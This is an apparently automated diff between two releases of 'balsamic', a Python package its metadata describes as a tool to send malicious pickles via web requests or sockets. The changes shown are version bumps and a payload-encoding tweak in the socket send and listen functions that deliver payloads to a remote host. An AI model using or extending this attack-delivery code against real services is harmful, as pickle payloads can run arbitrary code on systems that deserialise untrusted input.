# Comparing `tmp/balsamic-0.1.91.tar.gz` & `tmp/balsamic-0.1.92.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "balsamic-0.1.91.tar", last modified: Sat May 18 02:51:07 2024, max compression
+gzip compressed data, was "balsamic-0.1.92.tar", last modified: Sat May 18 02:53:30 2024, max compression
```

## Comparing `balsamic-0.1.91.tar` & `balsamic-0.1.92.tar`

### file list

```diff
@@ -1,15 +1,15 @@
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 02:51:07.252658 balsamic-0.1.91/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2139 2024-05-18 02:51:07.252658 balsamic-0.1.91/PKG-INFO
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1604 2024-05-17 23:29:20.000000 balsamic-0.1.91/README.md
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 02:51:07.252658 balsamic-0.1.91/balsamic/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-17 19:32:39.000000 balsamic-0.1.91/balsamic/__innit__.py
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2226 2024-05-18 02:50:42.000000 balsamic-0.1.91/balsamic/__main__.py
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1579 2024-05-18 02:50:09.000000 balsamic-0.1.91/balsamic/balsamic.py
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 02:51:07.252658 balsamic-0.1.91/balsamic.egg-info/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2139 2024-05-18 02:51:07.000000 balsamic-0.1.91/balsamic.egg-info/PKG-INFO
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)      241 2024-05-18 02:51:07.000000 balsamic-0.1.91/balsamic.egg-info/SOURCES.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-18 02:51:07.000000 balsamic-0.1.91/balsamic.egg-info/dependency_links.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-18 02:51:07.000000 balsamic-0.1.91/balsamic.egg-info/requires.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-18 02:51:07.000000 balsamic-0.1.91/balsamic.egg-info/top_level.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)       38 2024-05-18 02:51:07.252658 balsamic-0.1.91/setup.cfg
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1144 2024-05-18 02:50:50.000000 balsamic-0.1.91/setup.py
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 02:53:30.170569 balsamic-0.1.92/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2139 2024-05-18 02:53:30.170569 balsamic-0.1.92/PKG-INFO
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1604 2024-05-17 23:29:20.000000 balsamic-0.1.92/README.md
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 02:53:30.166569 balsamic-0.1.92/balsamic/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-17 19:32:39.000000 balsamic-0.1.92/balsamic/__innit__.py
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2226 2024-05-18 02:50:42.000000 balsamic-0.1.92/balsamic/__main__.py
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1661 2024-05-18 02:52:56.000000 balsamic-0.1.92/balsamic/balsamic.py
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 02:53:30.170569 balsamic-0.1.92/balsamic.egg-info/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2139 2024-05-18 02:53:30.000000 balsamic-0.1.92/balsamic.egg-info/PKG-INFO
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)      241 2024-05-18 02:53:30.000000 balsamic-0.1.92/balsamic.egg-info/SOURCES.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-18 02:53:30.000000 balsamic-0.1.92/balsamic.egg-info/dependency_links.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-18 02:53:30.000000 balsamic-0.1.92/balsamic.egg-info/requires.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-18 02:53:30.000000 balsamic-0.1.92/balsamic.egg-info/top_level.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)       38 2024-05-18 02:53:30.170569 balsamic-0.1.92/setup.cfg
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1144 2024-05-18 02:53:26.000000 balsamic-0.1.92/setup.py
```

### Comparing `balsamic-0.1.91/PKG-INFO` & `balsamic-0.1.92/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: balsamic
-Version: 0.1.91
+Version: 0.1.92
 Summary: Send malicious pickles via requests or sockets
 Author: Witchdoctor (malectrica)
 Keywords: python,hack,pickle,serialization,security,sockets,web
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
```

### Comparing `balsamic-0.1.91/README.md` & `balsamic-0.1.92/README.md`

 * *Files identical despite different names*

### Comparing `balsamic-0.1.91/balsamic/__main__.py` & `balsamic-0.1.92/balsamic/__main__.py`

 * *Files identical despite different names*

### Comparing `balsamic-0.1.91/balsamic/balsamic.py` & `balsamic-0.1.92/balsamic/balsamic.py`

 * *Files 9% similar despite different names*

```diff
@@ -38,26 +38,30 @@
 	return f"firing webreq attack against {schema}://{rhost} "
 
 def socksend(rhost,rport,payload, enc, steps=0):
 	rport=int(rport)
 	steps=int(steps)
 	if enc:
 		payload=utility.b64pickle(payload)
+	else:
+		payload=payload.encode("utf-8")
 	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 		s.connect((rhost,rport))
 		i=0
 		while i < steps:
 			s.sendall("arb".encode("utf-8"))
 		s.sendall(payload)
 		s.recv(1024)
 def socklisten(lport,payload, enc, steps=0):
 	lport=int(lport)
 	steps=int(steps)
 	if enc:
 		payload=utility.b64pickle(payload)
+	else:
+		payload=payload.encode("utf-8")
 	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 		s.bind(("",lport))
 		s.listen(1)
 		conn, addr = s.accept()
 		i=0
 		with conn:
 			while i < steps:
```

### Comparing `balsamic-0.1.91/balsamic.egg-info/PKG-INFO` & `balsamic-0.1.92/balsamic.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: balsamic
-Version: 0.1.91
+Version: 0.1.92
 Summary: Send malicious pickles via requests or sockets
 Author: Witchdoctor (malectrica)
 Keywords: python,hack,pickle,serialization,security,sockets,web
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
```

### Comparing `balsamic-0.1.91/setup.py` & `balsamic-0.1.92/setup.py`

 * *Files 10% similar despite different names*

```diff
@@ -3,15 +3,15 @@
 import os
 
 here = os.path.abspath(os.path.dirname(__file__))
 
 with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
     long_description = "\n" + fh.read()
 
-VERSION = '0.1.91'
+VERSION = '0.1.92'
 DESCRIPTION = 'Send malicious pickles via requests or sockets'
 LONG_DESCRIPTION = 'A package that allows the user to easily send out malicious pickles, via web requests, or a malicious server or client(currently ipv4 only)'
 
 # Setting up
 setup(
     name="balsamic",
     version=VERSION,
```

